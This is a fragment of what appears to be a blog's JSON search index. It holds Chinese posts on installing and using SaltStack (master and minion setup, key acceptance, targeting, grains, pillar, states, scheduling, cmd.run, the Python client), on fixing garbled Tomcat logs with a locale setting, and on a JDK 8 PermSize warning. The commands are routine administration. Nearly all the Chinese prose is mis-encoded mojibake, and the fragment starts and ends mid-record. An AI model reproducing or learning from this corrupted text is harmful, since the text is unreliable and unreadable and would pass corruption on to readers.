-v\"","link":"/2015/10/10/è‡ªåŠ¨åŒ–+Jenkins/saltstack/è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·--Saltstackå®‰è£…éƒ¨ç½²é…ç½®ä½¿ç”¨/"},{"title":"è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·--saltstackè¿œç¨‹å¯åŠ¨tomcatæ—¥å¿—ä¹±ç ","text":"è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·â€“saltstackè¿œç¨‹å¯åŠ¨tomcatæ—¥å¿—ä¹±ç æœ€è¿‘åœ¨çº¿ä¸Šå‘å¸ƒtomcatï¼Œæƒ³åšåˆ°è‡ªåŠ¨éƒ¨ç½²ï¼Œå¯æ˜¯å‡ºç°äº†é—®é¢˜ï¼Œå°±æ˜¯æ—¥å¿—è¾“å‡ºä¼šæœ‰ä¹±ç ï¼Œç”¨æˆ·åçš„getMyUserInfo æ˜¯ä¸€å †ä¹±ç ï¼ŒsaltåŸç†ç³»ç»Ÿå­—ç¬¦é›†æ²¡å¤ªæ·±å…¥çš„ç ”ç©¶ï¼Œåæ¥åœ¨å¢™å¤–çœ‹åˆ°ä¸€ç¯‡æ–‡ç« å¾ˆå®ç”¨ï¼Œå°±åšäº†ä¸‹è‡ªå·±çš„æ€»ç»“ã€‚ å¼€å§‹æˆ‘æ˜¯saltæ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚ 1salt 'tomcat_A1' cmd.run '/etc/init.d/tomcat-account start' ç›´æ¥è¿™æ ·å»æ‰§è¡Œï¼Œå‘ç°ä¼šå‡ºç°ä¹±ç ã€‚ è¿™æ˜¯æ—¥å¿—è¾“å‡ºç»“æœï¼Œæˆ‘ç”¨curlå»è°ƒæˆ‘çš„userinfoidï¼š è°ƒç”¨ä¹‹å‰æˆ‘è¿™è¾¹å…ˆåˆ é™¤äº†æŒ‡å®šçš„ç”¨æˆ·ä¿¡æ¯redisçš„ç¼“å­˜ï¼Œç„¶ååœ¨ç”¨curlåœ¨å¦å¤–ä¸€å°æœºå™¨ä¸Šé¢è°ƒç”¨çœ‹çœ‹ã€‚ tomcat_A1 æœºå™¨æ—¥å¿—ï¼šä¹±ç ï¼š 123456781nickname1:?????????11111nickname1:?????????33333334????????? åœ¨minionè®¾ç½®å­—ç¬¦é›†å¢åŠ LCALL=â€zhUS.UTF-8â€³ï¼š cat /etc/sysconfig/i18n 123LANG=\"en_US.UTF-8\"LC_ALL=\"zh_US.UTF-8\"SYSFONT=\"latarcyrheb-sun16\" cmd.run è°ƒç”¨æ—¶éœ€è¦åŠ å…¥env=â€™{â€œLCALLâ€:â€œzhCN.UTF-8â€}â€™ï¼š 1234salt 'tomcat_A1' cmd.run '/etc/init.d/tomcat-account sop' env='&#123;\"LC_ALL\": \"zh_CN.UTF-8\"&#125;'###å…ˆå…³é—­tomcatsalt 'tomcat_A1' cmd.run '/etc/init.d/tomcat-account start' env='&#123;\"LC_ALL\": \"zh_CN.UTF-8\"&#125;'###åœ¨å¯åŠ¨tomcat åœ¨è°ƒç”¨æŸ¥çœ‹ æ—¥å¿—å°±æ¢å¤æ­£å¸¸äº†ã€‚æ•°æ®åº“çš„ç”¨æˆ·åidä¹Ÿæ­£å¸¸äº†ï¼Œå¦‚æœä½ å†™å‘å¸ƒè„šæœ¬æŠŠtomcatå¯åŠ¨å†™åœ¨æ‰§è¡Œè„šæœ¬é‡Œé¢çš„è¯ï¼Œå¦‚æœæ·»åŠ äº†ä¸è¡Œï¼Œå°±æ‹†åˆ†å¼€ï¼Œå°±å¯ä»¥äº†ã€‚ è¿™æ˜¯ä¸€æ¬¡è¡€çš„æ•™è®­å•Šï¼Œå¯¹å­—ç¬¦é›†ä¸æ˜¯å¾ˆå¤šï¼Œå®Œå…¨æ‘¸ä¸ç€å¤´è„‘ï¼Œè¿˜å¥½å¤šæ™®åŠäº†ä¸‹ï¼Œç»ˆäºå¼„å¥½äº†ã€‚","link":"/2015/11/20/è‡ªåŠ¨åŒ–+Jenkins/saltstack/è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·--saltstackè¿œç¨‹å¯åŠ¨tomcatæ—¥å¿—ä¹±ç  /"},{"title":"è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·-Saltstackçš„è¯¦ç»†ä»‹ç»å®‰è£…ä¸ä½¿ç”¨ä»¥åŠè¯­æ³•å¼€å‘æ“ä½œ","text":"å¼•è¨€:è‡ªåŠ¨åŒ–è¿ç»´1:saltstack çš„åŸºæœ¬ä»‹ç»2:salt çš„å®‰è£… æœåŠ¡ç«¯ å®‰è£… é…ç½®æ–‡ä»¶ è¿è¡Œ æ³¨æ„äº‹é¡¹ å®¢æˆ·ç«¯ å®‰è£… é…ç½®æ–‡ä»¶ è¿è¡Œ æ³¨æ„äº‹é¡¹ 3:salt çš„ä½¿ç”¨: åŸºç¡€çŸ¥è¯† targeting nodegroup grains pillar çŠ¶æ€ç®¡ç† state state è¯­æ³• state çš„é€»è¾‘å…³ç³» highstate salt schedule å®æ—¶ç®¡ç† cmd.run module æ—  master4:salt å¼€å‘ saltclient ç®¡ç† salt salt api å¼•è¨€:è‡ªåŠ¨åŒ–è¿ç»´ è¿ç»´çš„å·¥ä½œä¸»è¦åœ¨2æ–¹é¢: çŠ¶æ€çš„ç®¡ç† ç³»ç»Ÿæ€§èƒ½è°ƒä¼˜ è¿™é‡Œä¸»è¦ç®€ä»‹ä¸‹è¿ç»´çŠ¶æ€çš„ç®¡ç†:å¯¹äºè¿ç»´æ¥è¯´,åŸºäºçŠ¶æ€çš„é…ç½®ç®¡ç†å·²ç»å‘è‡ªåŠ¨åŒ–è¿ˆè¿›äº†ä¸€å¤§æ­¥,ä»¥çŠ¶æ€ä¸ºæ ¸å¿ƒçš„è¿ç»´,è®©çŠ¶æ€æœ¬èº«æœ‰äº†å¯ç®¡ç†æ€§;åœ¨è¿ç»´è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¼šå‘ç°,åŒæ ·çš„ä¸€ä¸ªé…ç½®,æˆ‘ä»¬ä¼šåœ¨ä¸åŒçš„æ—¶é—´, ä¸åŒçš„åœ°ç‚¹ä¸€æ¬¡åœ¨ä¸€æ¬¡çš„é…ç½®,è¿™ä¸ªæ—¶å€™,é…ç½®ç®¡ç†å°±æœ‰äº†é‡å¤æ€§;æœ‰çš„ç”šè‡³æ˜¯åŸå°ä¸åŠ¨çš„é‡ å¤,è€Œå¦å¤–ä¸€äº›åˆ™æ˜¯æŒ‰ç…§ä¸€å®šçš„è§„å¾‹åœ¨å‘å±•,è¿™äº›æŒ‰ç…§ä¸€å®šè§„å¾‹å‘å±•çš„é…ç½®,å°±æ˜¯å¯é¢„æµ‹çš„.ç»¼ ä¸Šæˆ‘è®¤è¯†çš„,æˆ‘ä»¬è¿ç»´å·¥ä½œçš„æœ¬èº«æ˜¯å¯ç®¡ç†,å¯é‡å¤,å¯é¢„æµ‹çš„.åŸºäºè¿™æ ·çš„ç†å¿µ,æˆ‘ä»¬å°±å¯ä»¥æ›´ é«˜ä¸€æ­¥çš„æ¨è¿›æˆ‘ä»¬çš„è¿ç»´è‡ªåŠ¨åŒ–,ç”šè‡³åˆ°æ™ºèƒ½åŒ–. çœ‹åˆ°è¿™é‡Œ,æˆ‘ç†æƒ³ä¸­çš„è¿ç»´è‡ªåŠ¨åŒ–çš„é…ç½®ç®¡ç†å¹³å°åº”è¯¥æœ‰å¦‚ä¸‹åŠŸèƒ½: å¯¹çŠ¶æ€çš„é…ç½®åŠç®¡ç†(æœ€åŸºæœ¬çš„) å¯ä»¥åŠæ—¶çš„å¯¹ç³»ç»ŸçŠ¶æ€è¿›è¡Œè°ƒæ•´å¹¶èƒ½çœ‹åˆ°ç»“æœ(å¯ä»¥æ–¹ä¾¿çš„å®æ—¶å‡çº§ç³»ç»ŸçŠ¶æ€) å¯ä»¥å¯¹å…¶æœ¬èº«åšæ–¹ä¾¿çš„ç¬¬ä¸‰æ–¹ç®¡ç†(å€ŸåŠ©å…¶ API,ç›´æ¥ç»™çŠ¶æ€åˆ¶å®šå¥½å…¶å‘å±•æ–¹å‘) åŠ åˆ†é¡¹: å¼€å‘è¯­è¨€å•ä¸€ æ¶æ„ç®€å•,çµæ´» æœ‰ä¸å·®çš„å®‰å…¨æ€§ æ²¡æœ‰å•†ä¸šç‰ˆä¸‹é¢æ˜¯ç°æœ‰æ¯”è¾ƒæœ‰ä»£è¡¨æ€§çš„è‡ªåŠ¨åŒ–é…ç½®ç®¡ç†å·¥å…·: é™„:ä»¥ä¸‹ä»…åŸºäºå¼€æºç‰ˆæœ¬è¿›è¡Œä»‹ç» ç†å¿µ ä¼˜ç¼ºç‚¹puppet ä»è¿ç»´çš„è§’åº¦å»åšé…ç½®ç®¡ç†(è¿ç»´äººå‘˜åšç»™è¿ç»´ç”¨çš„) æ¶æ„ç®€å•,ç³»ç»Ÿæ¯”è¾ƒæˆç†Ÿ/ä¸ä¾¿äºç¬¬ä¸‰æ–¹ç®¡ç† chef ä»ç ”å‘çš„è§’åº¦å»åšé…ç½®ç®¡ç†(ç ”å‘äººå‘˜åšç»™è¿ç»´ç”¨çš„) è¾ƒä¾¿äºç¬¬ä¸‰æ–¹ç®¡ç†,å¯¹è‡ªèº«(èŠ‚ç‚¹,å˜é‡,cookbook)çš„ç®¡ç†è¾ƒæ–¹ä¾¿,æœ‰è‡ªå·±çš„ dashboard,cookbook æ”¯æŒç‰ˆæœ¬ç®¡ç†,è‡ªä» cookbook çš„ç‰ˆæœ¬ç®¡ç†/æ¶æ„å¤æ‚,å¼€å‘è¯­è¨€è¾ƒå¤š,(å®‰å…¨é—®é¢˜) ä»¥ä¸Š 2 è€…éƒ½æ¯”è¾ƒä¾§é‡äºçŠ¶æ€çš„ç®¡ç†,å¯¹å•ä¸ªæˆ–è€…å¤šä¸ªçŠ¶æ€çš„ä¸´æ—¶è°ƒæ•´æˆ–è€…ç®¡ç†è¾ƒå·® 2 ä¸ªéƒ½æœ‰å•†ä¸šç‰ˆ,è®©æˆ‘è¿™ä¸ªç”¨å¼€æºç‰ˆçš„å¾ˆè‡ªå‘ è¿™é‡Œæˆ‘ä»¬ä¹Ÿèƒ½çœ‹åˆ°,2 ä¸ªé…ç½®åŠŸèƒ½éƒ½æ²¡èƒ½è¾¾åˆ°æˆ‘ç†æƒ³ä¸­çš„çŠ¶æ€,é‚£å°±æš‚ç”¨ chef å§,ç›´åˆ°æœ‰ ä¸€å¤©,äº†è§£åˆ°äº† saltstack çœ‹åˆ°äº†è¿™å¥è¯:â€œ ç³»ç»Ÿé…ç½®çš„è‡ªåŠ¨åŒ–ä¸ä»…å¯é¢„æµ‹,å¯é‡å¤, è¿˜å…·æœ‰å¯ ç®¡ç†æ€§â€(http://wiki.saltstack.cn/reproduction/dive-into-saltstack),è¿™å°¼ç›æ‰æ˜¯è¿ç»´è‡ªåŠ¨åŒ–çš„æœª æ¥å•Š,äºæ˜¯æ¯«æ— èŠ‚æ“çš„å¼€å§‹å­¦ä¹  salt,è€Œä¸”å‘ç°è¶Šå­¦è¶Šå–œæ¬¢;åœ¨æˆ‘ä½¿ç”¨ puppet åŠ chef çš„æ—¶ å€™éƒ½æ²¡æœ‰ä½¿ç”¨ salt çš„æ„Ÿè§‰,å¤ªçˆ½äº†ã€‚æ‰€ä»¥æˆ‘è¿™é‡Œä»…ä»…ä»‹ç»å‡ æœ¬çš„è¯­æ³•ä¸æ¶‰åŠå®é™…ç”¨ä¾‹,salt çš„å®‰è£…éå¸¸æ–¹ä¾¿,æ‰€ä»¥ä½ åœ¨çœ‹æœ¬æ–‡æ¡£çš„æ—¶å€™å¸Œæœ›ä½ èƒ½çœŸæ­£çš„åŠ¨æ‰‹å»åšä¸€ä¸‹,ç„¶åä½ å°±ä¼šçˆ±ä¸Š salt äº† 1é™„:å¦‚æœä½ ä¼š python,salt åŸºæœ¬æ˜¯ä¸éœ€è¦æ€ä¹ˆå­¦çš„,è€Œæˆ‘æ­£å¥½äº†è§£ä¸€ç‚¹ py,ä¸è¿‡è¿™æœ€å¤šå æˆ‘é€‰æ‹© salt çš„ 20%ã€‚ 1:saltstack çš„åŸºæœ¬ä»‹ç»salt æ˜¯ä¸€ä¸ªæ–°çš„åŸºç¡€å¹³å°ç®¡ç†å·¥å…·ã€‚å¾ˆçŸ­çš„æ—¶é—´å³å¯è¿è¡Œå¹¶ä½¿ç”¨èµ·æ¥, æ‰©å±•æ€§è¶³ä»¥æ”¯æ’‘ç®¡ç†ä¸Šä¸‡å°æœåŠ¡å™¨,æ•°ç§’é’Ÿå³å¯å®Œæˆæ•°æ®ä¼ é€’. ç»å¸¸è¢«æè¿°ä¸º Func åŠ å¼ºç‰ˆ+Puppet ç²¾ç®€ç‰ˆã€‚ salt çš„æ•´ä¸ªæ¶æ„éƒ½æ˜¯åŸºäºæ¶ˆæ¯æ¥å®ç°.æ‰€ä»¥èƒ½å¤Ÿæä¾›æ¨ªå¼ºçš„æ‹“å±•æ€§,çµæ´»æ€§,å®æ—¶æ€§;ä¸å¤¸ äº†,çœ‹å®é™…çš„ slat æ˜¯ä»€ä¹ˆæ ·çš„ä¸è¿‡ salt è¿˜æ˜¯ä¸€ä¸ªå¾ˆå¹´è½»çš„ä¸œè¥¿,è¿˜æœ‰å¾ˆå¤šåœ°æ–¹ä¸å¤Ÿå®Œå–„,åšçš„ä¸å¤Ÿå¥½,ä¸è¿‡æˆ‘ç›¸ä¿¡è¿™ äº›éƒ½åªæ˜¯æ—¶é—´é—®é¢˜ã€‚ æ³¨:ä»¥ä¸‹æ–‡æ¡£ä»…ä»…ä¸ºåŸºæœ¬å†…å®¹,ç›¸å…³çŸ¥è¯†ç‚¹çš„æ·±å…¥å­¦ä¹ ,è¯·çœ‹ç›¸åº”æ–‡æ¡£è¿æ¥ ##2:salt çš„å®‰è£… å®‰è£…æœ‰å¾ˆå¤šé€”å¾„,ä½œä¸ºä¸€ä¸ª centos çš„ç”¨æˆ·,æˆ‘é€‰æ‹© rpm é¦–å…ˆæ·»åŠ  RPM æº:rpm -ivh http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpm é™„:å®é™…ç”Ÿäº§ä¸­æˆ‘æ˜¯è‡ªå»ºæºepel ä¸­å…³äº salt çš„åŒ…: 1234salt-api.noarch : A web api for to access salt the parallel remote execution system salt-master.noarch : Management component for salt, a parallel remote executionsystemsalt-minion.noarch : Client component for salt, a parallel remote execution system salt.noarch : A parallel remote execution systemsalt-cloud.noarch : Generic cloud provisioning tool 1:æœåŠ¡ç«¯ 1:å®‰è£…123456789101112131415yum install salt-master 2:é…ç½®æ–‡ä»¶/etc/salt/masteré…ç½®æ–‡ä»¶é€‰é¡¹ä»‹ç»: http://docs.saltstack.com/ref/configuration/master.htmlæœ€åŸºæœ¬å­—æ®µ:interface: æœåŠ¡ç«¯ç›‘å¬ IP3:è¿è¡Œ è°ƒè¯•æ¨¡å¼:salt-master -l debug åå°è¿è¡Œ:salt-master -dä½œä¸º centos ç®¡ç†å‘˜,æˆ‘é€‰æ‹©:/etc/init.d/salt-master start 4:æ³¨æ„äº‹é¡¹:1:ç›‘å¬ç«¯å£4505(publish_port):salt çš„æ¶ˆæ¯å‘å¸ƒç³»ç»Ÿ 4506(ret_port):salt å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡çš„ç«¯å£æ‰€ä»¥ç¡®ä¿å®¢æˆ·ç«¯èƒ½è·ŸæœåŠ¡ç«¯çš„è¿™2ä¸ªç«¯å£é€šä¿¡ å®‰è£…å®¢æˆ·ç«¯123456789101112131415161718192021222324252627282930313233343536373839yum install salt-minion 2:é…ç½®æ–‡ä»¶/etc/salt/minioné…ç½®æ–‡ä»¶é€‰é¡¹ä»‹ç»: http://docs.saltstack.com/ref/configuration/minion.html æœ€åŸºæœ¬å­—æ®µ:master: æœåŠ¡ç«¯ä¸»æœºåid: å®¢æˆ·ç«¯ä¸»æœºå(åœ¨æœåŠ¡ç«¯çœ‹åˆ°çš„å®¢æˆ·ç«¯çš„åå­—)3:è¿è¡Œ è°ƒè¯•æ¨¡å¼:salt-minion -l debug åå°è¿è¡Œ:salt-minion -dä½œä¸º centos ç®¡ç†å‘˜,æˆ‘é€‰æ‹©:/etc/init.d/salt-minion start 4:æ³¨æ„äº‹é¡¹:1:minion é»˜è®¤å’Œä¸»æœºå salt çš„ä¸»æœºé€šä¿¡ 2:å…³äºé…ç½®æ–‡ä»¶salt çš„é…ç½®æ–‡ä»¶å‡ä¸º yaml é£æ ¼$key: $value #æ³¨æ„å†’å·åæœ‰ä¸€ä¸ªç©ºæ ¼ 3:åŸºç¡€çŸ¥è¯†1:salt minion å’Œ master çš„è®¤è¯è¿‡ç¨‹:(1) minion åœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶,ä¼šåœ¨/etc/salt/pki/minion/ä¸‹è‡ªåŠ¨ç”Ÿæˆminion.pem(private key), minion.pub(public key),ç„¶åå°† minion.pub å‘é€ç»™ master(2) master åœ¨æ¥æ”¶åˆ° minion çš„ public key å,é€šè¿‡ salt-key å‘½ä»¤ accept minion public key,è¿™æ ·åœ¨ master çš„/etc/salt/pki/master/minions ä¸‹çš„å°†ä¼šå­˜æ”¾ä»¥ minion id å‘½åçš„public key, ç„¶å master å°±èƒ½å¯¹ minion å‘é€æŒ‡ä»¤äº†å¦‚ä¸‹: å¯åŠ¨æœåŠ¡ç«¯:/etc/init.d/salt-minion restartå¯åŠ¨å®¢æˆ·ç«¯:/etc/init.d/salt-minion restart æœåŠ¡ç«¯æŸ¥çœ‹key:salt-keyAccepted Keys:Unaccepted Keys: minion1Rejected Keys:æœåŠ¡ç«¯æ¥å— key salt-key -a minion1æµ‹è¯•:salt 'minion1' test.ping minion1:Trueé™„:salt æ›´å¤šå‘½ä»¤åŠæ‰‹å†Œ salt '*' sys.doc 3:salt çš„ä½¿ç”¨: 1:åŸºç¡€çŸ¥è¯†1:targeting 123456789salt '*' test.pingå¼•å·ä¸­ä»¥å®ç°å¾ˆå¼ºå¤§çš„ minion çš„è¿‡æ»¤ä¸åŒ¹é…æŠ€æœ¯ æ–‡æ¡£:http://docs.saltstack.com/topics/targeting /compound.htmlå¸¸ç”¨å‘½ä»¤:salt 'shell æ­£åˆ™' å‘½ä»¤salt -E 'prel æ­£åˆ™'salt -N $group å‘½ä»¤salt -L 'server_id1,server_id2,server_id3' å‘½ä»¤ç¤ºä¾‹:salt -C 'webserv* and G@os:Debian or E@web-dc1-srv.*' test.ping 2:nodegroupå¯¹ minion è¿›è¡Œåˆ†ç»„ 1234567æ–‡æ¡£: http://docs.saltstack.com/topics/targeting/nodegroups.html åœ¨ master çš„é…ç½®æ–‡ä»¶ä¸­æŒ‰å¦‚ä¸‹æ ¼å¼å®šä¹‰:nodegroups:group1: 'L@foo.domain.com,bar.domain.com,baz.domain.com orbl*.domain.com'group2: 'G@os:Debian and foo.domain.com' åœ¨ state æˆ–è€… pillar ä¸­å¼•ç”¨çš„æ—¶å€™å¦‚ä¸‹:base: group1:- match: nodegroup - webserver 3:grainsminion åŸºæœ¬ä¿¡æ¯çš„ç®¡ç† æ–‡æ¡£:http://docs.saltstack.com/topics/targeting /grains.html åŸºæœ¬ä½¿ç”¨: 123456salt '*' grains.ls æŸ¥çœ‹ grains åˆ†ç±»salt '*' grains.items æŸ¥çœ‹ grains æ‰€æœ‰ä¿¡æ¯salt '*' grains.item osrelease æŸ¥çœ‹ grains æŸä¸ªä¿¡æ¯ç¤ºä¾‹:salt '*' grains.item osrelease minoin1:osrelease: 6.2 minion çš„å˜é‡åœ¨ç”¨ salt è¿›è¡Œç®¡ç†å®¢æˆ·ç«¯çš„æ—¶å€™æˆ–è€…å†™ state çš„æ—¶å€™éƒ½å¯ä»¥å¼•ç”¨ grains çš„å˜é‡ 4:pillar salt æ•æ„Ÿä¿¡æ¯çš„ç®¡ç†,åªæœ‰åŒ¹é…åˆ°çš„èŠ‚ç‚¹æ‰èƒ½çœ‹åˆ°å’Œä½¿ç”¨ æ–‡æ¡£:http://docs.saltstack.com/topics/tutorials/pillar.html é»˜è®¤:pillar æ•°æ®å®šä¹‰æ–‡ä»¶å­˜å‚¨è·¯å¾„:/srv/pillar å…¥å£æ–‡ä»¶:/srv/pillar/top.sls 12345678910111213141516171819202122232425262728293031æ ¼å¼: base:\"targeting\":- $pillar$pillar.sls åŸºæœ¬:$key: $value state å¼•ç”¨æ–¹å¼:&#123;&#123; pillar['$key'] &#125;&#125;å¤æ‚:users:thatch: 1000 shouse: 1001 utahdave: 1002 redbeard: 1003state å¼•ç”¨æ–¹å¼:&#123;% for user, uid in pillar.get('users', &#123;&#125;).items() %&#125;&#123;&#123;user&#125;&#125;: user.present:- uid: &#123;&#123;uid&#125;&#125; &#123;% endfor %&#125;æŸ¥çœ‹èŠ‚ç‚¹çš„ pillar æ•°æ®: salt 'client2' pillar.dataåŒæ­¥ pillar:salt '*' saltutil.refresh_pillaré™„:è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°,pallar ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨ jinja(åé¢ä¼šæåˆ°)åšä¸€äº›å¤„ç† 5:minionå³ä¸º salt çš„å®¢æˆ·ç«¯2:çŠ¶æ€ç®¡ç† 1:statesalt åŸºäº minion è¿›è¡ŒçŠ¶æ€çš„ç®¡ç† 1:state è¯­æ³•æ–‡æ¡£:http://docs.saltstack.com/ref/states/all/index.html#åå­—ä¸ºpillar.slsçš„æ–‡ä»¶æ¥å­˜æ”¾å¯¹åŒ¹é…åˆ°çš„&#123;% if grains['os_family'] == 'RedHat' %&#125; - name: vim-enhanced&#123;% elif grains['os'] == 'Debian' %&#125;- name: vim-nox&#123;% elif grains['os'] == 'Ubuntu' %&#125; - name: vim-nox&#123;% endif %&#125;- installedå¦‚æœæ˜¯ redhard ç³»åˆ—çš„å°±å®‰è£… vim-enhanced,å¦‚æœç³»ç»Ÿæ˜¯ Debian æˆ– è€… Ubuntu å°±å®‰è£… vim-noxä»¥æœ‰å¤šä¸ªé™„:state é»˜è®¤ä½¿ç”¨ jinja(http://jinja.pocoo.org/)çš„æ¨¡æ¿è¯­æ³•, æ–‡æ¡£åœ°å€: http://jinja.pocoo.org /docs/templates/ 2:state çš„é€»è¾‘å…³ç³»: æ–‡æ¡£:http://docs.saltstack.com/ref/states/ordering.html 1234567require:ä¾èµ–æŸä¸ª state,åœ¨è¿è¡Œæ­¤ state å‰,å…ˆè¿è¡Œä¾èµ–çš„ state,ä¾èµ–å¯httpd: pkg:- installed file.managed:- name: /etc/httpd/conf/httpd.conf - source: salt://httpd/httpd.conf- require:- pkg: httpd watch:åœ¨æŸä¸ª state å˜åŒ–æ—¶è¿è¡Œæ­¤æ¨¡å— redis: 123456789pkg:- latestfile.managed:- source: salt://redis/redis.conf- name: /etc/redis.conf- require:- pkg: redis service.running: - enable: True#state çš„åå­— $state: #è¦ç®¡ç†çš„æ¨¡å—ç±»å‹ - $State states #è¯¥æ¨¡å—çš„çŠ¶æ€ 123- watch:- file: /etc/redis.conf - pkg: redis é™„:watch é™¤å…·å¤‡ require åŠŸèƒ½å¤–,è¿˜å¢äº†å…³æ³¨çŠ¶æ€çš„åŠŸèƒ½ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849order:ä¼˜å…ˆçº§æ¯” require å’Œ watch ä½æœ‰ order æŒ‡å®šçš„ state æ¯”æ²¡æœ‰ order æŒ‡å®šçš„ä¼˜å…ˆçº§é«˜ vim:pkg.installed: - order: 1æƒ³è®©æŸä¸ª state æœ€åä¸€ä¸ªè¿è¡Œ,å¯ä»¥ç”¨ last 3:state ä¸ minionå°†ä¸´æ—¶ç»™ minoin åŠ ä¸ª statesalt 'minion1' state.sls 'vim' #ç»™ minion1 åŠ ä¸€ä¸ª vim çš„ state æ‰§è¡Œè¯¥å‘½ä»¤åå¯ä»¥ç«‹å³çœ‹åˆ°è¾“å‡ºç»“æœ2:highstateç»™ minion æ°¸ä¹…ä¸‹æ·»åŠ çŠ¶æ€æ–‡æ¡£: http://docs.saltstack.com/ref/states/highstate.html é»˜è®¤é…ç½®æ–‡ä»¶:/srv/salt/top.slsè¯­æ³•:'*':- core- wsproxy - /srv/salt/ç›®å½•ç»“æ„:.â”œâ”€â”€ core.sls â”œâ”€â”€ top.sls â””â”€â”€ wsproxyâ”œâ”€â”€ init.sls â”œâ”€â”€ websocket.py â””â”€â”€ websockifyåº”ç”¨:salt \"minion1\" state.highstateæµ‹è¯•æ¨¡å¼:salt \"minion1\" state.highstate -v test=True 3:salt scheduleé»˜è®¤çš„ state åªæœ‰åœ¨æœåŠ¡ç«¯è°ƒç”¨çš„æ—¶å€™æ‰æ‰§è¡Œ,å¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¸Œæœ› minon è‡ªè§‰ çš„å»ä¿æŒåœ¨æŸä¸ªçŠ¶æ€æ–‡æ¡£:http://docs.saltstack.com/topics/jobs/schedule.htmlcat /srv/pillar/top.sls base:\"*\":- schedulecat /srv/pillar/schedule.sls schedule:highstate:function: state.highstate minutes: 30å¦‚ä¸Šé…ç½®:minion ä¼šæ²¡ 30 åˆ†é’Ÿä» master æ‹‰å»ä¸€æ¬¡é…ç½®,è¿›è¡Œè‡ªæˆ‘é…ç½®3:å®æ—¶ç®¡ç† æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦ä¸´æ—¶çš„æŸ¥çœ‹ä¸€å°æˆ–å¤šå°æœºå™¨ä¸Šçš„æŸä¸ªæ–‡ä»¶,æˆ–è€…æ‰§è¡ŒæŸä¸ªå‘½ä»¤1:cmd.runç”¨æ³• salt '$targeting' cmd.run '$cmd'ç¤ºä¾‹:salt '*' cmd.run 'hostname' æ‰§è¡Œä¸‹è¿™æ ·çš„å‘½ä»¤,é©¬ä¸Šå°±æ„Ÿå—åˆ°æ•ˆæœäº†,é€Ÿåº¦è¿˜è´¼å¿«2:moduleåŒæ—¶,salt ä¹Ÿå°†ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤åšäº†é›†æˆ æ–‡æ¡£:http://docs.saltstack.com/ref/modules/all/index.html è¿™é‡Œå‡ ä¹æ¶µç›–äº†æˆ‘ä»¬æ‰€æœ‰çš„å¸¸ç”¨å‘½ä»¤æ¯”å¦‚:æŸ¥çœ‹æ‰€æœ‰èŠ‚ç‚¹ç£ç›˜ä½¿ç”¨æƒ…å†µsalt '*' disk.usage æ–‡æ¡£:http://docs.saltstack.com/topics/tutorials/quickstart.html4:æ—  masterä¸»è¦åº”è¯¥åœ¨æµ‹è¯•å’Œ salt å•æœºç®¡ç†çš„æ—¶å€™ 4:salt å¼€å‘1:saltclient ç®¡ç† saltåªæœ‰æ‰ master æ‰å¯ä»¥salt å…¨éƒ¨ç”¨ python,è¿™é‡Œä¹Ÿç”¨ pythonæ–‡æ¡£:http://docs.saltstack.com/ref/python-api.html ç¤ºä¾‹: 1234import salt.clientclient = salt.client.LocalClient()ret = client.cmd('*', 'cmd.run', ['ls -l'])print ret 2:salt apisalt api æˆ‘ç°åœ¨è¿˜æ²¡ç”¨,ä¸è¿‡æˆ‘ä¹Ÿæ²¡æå®š,å¦‚æœä½ æå®šäº†,æˆ‘ä¼šéå¸¸æ„Ÿè°¢ä½ èƒ½åˆ†äº«ä¸‹çš„ã€‚ ####å‚è€ƒæ–‡æ¡£: 1:salt ä¸­æ–‡ wiki:http://wiki.saltstack.cn/ å¾ˆä¸é”™çš„æ–‡ç« :http://wiki.saltstack.cn/reproduction/dive-into-saltstack2:salt å®˜ç½‘ http://saltstack.com/ å®˜ç½‘æ–‡æ¡£:http://docs.saltstack.com/","link":"/2015/09/10/è‡ªåŠ¨åŒ–+Jenkins/saltstack/è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·-Saltstackçš„è¯¦ç»†ä»‹ç»å®‰è£…ä¸ä½¿ç”¨ä»¥åŠè¯­æ³•å¼€å‘æ“ä½œ/"},{"title":"tomcatä¼˜åŒ–é‡åˆ°jdk1.8å‡ºç°âš ï¸è­¦å‘Šï¼šwarning:ignoring option PermSize=512msupport was removed in 8.0","text":"tomcatæ€§èƒ½ä¼˜åŒ–ï¼šJava HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=512m; support was removed in 8.0è¿™ä¸ªæç¤ºåº”è¯¥æ˜¯å‡çº§JDK1.8ä»¥ä¸Š åœ¨Javaçš„8å‘½ä»¤è¡Œæ ‡å¿—MaxPermSizeå·²è¢«åˆ é™¤ã€‚å…¶åŸå› æ˜¯ï¼ŒæŒä¹…ä»£ä»çƒ­ç‚¹å †ä¸­å–å‡ºå¹¶è½¬ç§»åˆ°æœ¬æœºå†…å­˜ã€‚æ‰€ä»¥ä¸ºäº†æ¶ˆé™¤è¿™ç§ä¿¡æ¯ç¼–è¾‘java_OPTSç¯å¢ƒç”¨æˆ·å˜é‡ã€‚ åœ¨ç½‘ä¸ŠæŸ¥è¯¢åˆ°ï¼š -XXï¼šMaxPermSize =sizeè®¾ç½®æœ€å¤§æ°¸ä¹…ä»£ç©ºé—´çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚æ­¤é€‰é¡¹æ˜¯ä¸èµæˆä½¿ç”¨JDK 8ï¼Œå¹¶é€šè¿‡-XXå–ä»£ï¼šMaxMetaspaceSizeé€‰é¡¹ã€‚ -XXï¼šPermSize = 